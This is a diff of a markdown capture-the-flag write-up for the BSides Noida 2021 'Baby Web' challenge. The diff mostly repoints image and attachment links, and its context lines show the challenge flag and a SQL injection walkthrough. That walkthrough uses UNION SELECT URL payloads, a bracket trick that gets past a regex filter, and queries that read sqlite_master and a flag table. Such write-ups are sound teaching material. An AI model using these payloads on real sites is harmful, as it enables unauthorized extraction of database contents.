@@ -7,7 +7,7 @@ Note : Bruteforce is not required.
 [chall link](http://ctf.babyweb.bsidesnoida.in/)
 
 # Attachments
-[sauce](https://storage.googleapis.com/noida_ctf/Web/baby_web.zip)
+[sauce](https://github.com/MikelAcker/CTF_WRITEUPS_2021/blob/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/baby_web.zip?raw=true)
 
 # Solution
 ### Unintended Solution
@@ -17,7 +17,7 @@ So, access it and search for the flag
 
 http://ctf.babyweb.bsidesnoida.in/karma.db
 
-<img src="https://github.com/MikelAcker/BSides_Noida_CTF_2021/blob/main/Web/Baby%20Web/info1.png">
+<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info1.png">
 
 *flag*: `BSNoida{4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4}`
 
@@ -37,7 +37,7 @@ The parameter's vaule is **unfiltered**.So, we can do *injection* attack.
 
 But, when we send payloads which contains *alphabet*, it gives error.
 
-<img src="https://github.com/MikelAcker/BSides_Noida_CTF_2021/blob/main/Web/Baby%20Web/info2.png">
+<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info2.png">
 
 Checking carefully the *given* files again, I found that there is a **regex** that is used to prevent alphabets and white spaces in `chall_id` from `config/ctf.conf` file
 ```
@@ -64,7 +64,7 @@ We can do **injection** now!!!
 
 `http://ctf.babyweb.bsidesnoida.in/?chall[id=1+or+1=1`
 
-<img src="https://github.com/MikelAcker/BSides_Noida_CTF_2021/blob/main/Web/Baby%20Web/info3.png">
+<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info3.png>
 
 From opening given `karma.db` file, we can see that there are 6 *columns*.
 ```
@@ -84,13 +84,13 @@ Now, we can use **UNION SELECT** payload
 
 `http://ctf.babyweb.bsidesnoida.in/?chall[id=1+union+select+1,2,3,4,5,6`
 
-<img src="https://github.com/MikelAcker/BSides_Noida_CTF_2021/blob/main/Web/Baby%20Web/info4.png">
+<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info4.png">
 
 We can extract all the **tables** from **sqlite_master**
 
 `http://ctf.babyweb.bsidesnoida.in/?chall[id=1+union+select+1,2,3,4,5,sql+from+sqlite_master`
 
-<img src="https://github.com/MikelAcker/BSides_Noida_CTF_2021/blob/main/Web/Baby%20Web/info5.png">
+<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info5.png">
 
 There is a *table* **flagsss** and a column **flag** in it
 
@@ -98,11 +98,11 @@ Let's see if the flag is there
 
 `http://ctf.babyweb.bsidesnoida.in/?chall[id=1+union+select+1,2,3,4,5,flag+from+flagsss`
 
-<img src="https://github.com/MikelAcker/BSides_Noida_CTF_2021/blob/main/Web/Baby%20Web/info6.png">
+<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info6.png">
 
 Can't see the whole **flag** so I look at the source
 
-<img src="https://github.com/MikelAcker/BSides_Noida_CTF_2021/blob/main/Web/Baby%20Web/info7.png">
+<img src="https://raw.githubusercontent.com/MikelAcker/CTF_WRITEUPS_2021/main/BSides_Noida_CTF_2021_Writeup/Web/Baby%20Web/info7.png">
 
 And, there is the **flag**
 
